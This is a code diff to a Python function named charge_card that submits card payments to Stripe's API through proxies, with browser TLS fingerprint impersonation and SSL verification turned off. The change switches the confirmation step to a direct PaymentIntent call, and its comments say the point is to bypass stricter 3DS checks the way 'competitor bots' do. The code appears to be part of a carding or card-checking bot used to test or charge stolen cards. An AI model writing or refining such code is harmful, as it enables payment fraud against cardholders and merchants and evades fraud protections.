@@ -1190,28 +1190,49 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
             
             print(f"[DEBUG] Step 2: Confirming with token {pm_id[:20]}...")
             
-            # --- STEP 2: Confirm checkout with PM token ---
-            # This is the real Stripe.js flow — confirm uses pm_xxxx, NOT raw card data
-            conf_body = (
-                f"eid={eid}"
-                f"&payment_method={pm_id}"
-                f"&expected_amount={total}"
-                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
-                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
-                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
-                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
-                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
-                f"&expected_payment_method_type=card"
-                f"&key={pk}"
-                f"&init_checksum={checksum}"
-            )
+            # --- STEP 2: Confirm via PaymentIntent (NOT checkout session) ---
+            # Checkout Session confirm (/v1/payment_pages/) has STRICTER 3DS enforcement
+            # Direct PaymentIntent confirm (/v1/payment_intents/) is more lenient
+            # This is how competitor bots work — they bypass checkout-level 3DS
+            
+            pi_data = init_data.get("payment_intent") or {}
+            pi_id = pi_data.get("id")
+            pi_secret = pi_data.get("client_secret")
+            
+            if pi_id and pi_secret:
+                # Direct PaymentIntent confirm — less strict 3DS
+                print(f"[DEBUG] Using PaymentIntent confirm: {pi_id[:25]}...")
+                conf_body = (
+                    f"payment_method={pm_id}"
+                    f"&expected_payment_method_type=card"
+                    f"&client_secret={pi_secret}"
+                    f"&key={pk}"
+                )
+                confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
+            else:
+                # Fallback: Checkout Session confirm (if no PI data)
+                print(f"[DEBUG] Fallback: Checkout Session confirm")
+                conf_body = (
+                    f"eid={eid}"
+                    f"&payment_method={pm_id}"
+                    f"&expected_amount={total}"
+                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
+                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
+                    f"&expected_payment_method_type=card"
+                    f"&key={pk}"
+                    f"&init_checksum={checksum}"
+                )
+                confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
             
             # Use curl_cffi for TLS/JA3 fingerprint impersonation if available
             if HAS_CURL_CFFI:
                 try:
                     async with CurlAsyncSession(impersonate="chrome131") as curl_s:
                         resp = await curl_s.post(
-                            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                            confirm_url,
                             headers=headers,
                             data=conf_body,
                             proxy=proxy_url,
@@ -1223,7 +1244,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     connector = aiohttp.TCPConnector(limit=100, ssl=False)
                     async with aiohttp.ClientSession(connector=connector) as s:
                         async with s.post(
-                            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                            confirm_url,
                             headers=headers, data=conf_body, proxy=proxy_url
                         ) as r:
                             conf = await r.json()
@@ -1231,7 +1252,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 connector = aiohttp.TCPConnector(limit=100, ssl=False)
                 async with aiohttp.ClientSession(connector=connector) as s:
                     async with s.post(
-                        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                        confirm_url,
                         headers=headers, data=conf_body, proxy=proxy_url
                     ) as r:
                         conf = await r.json()
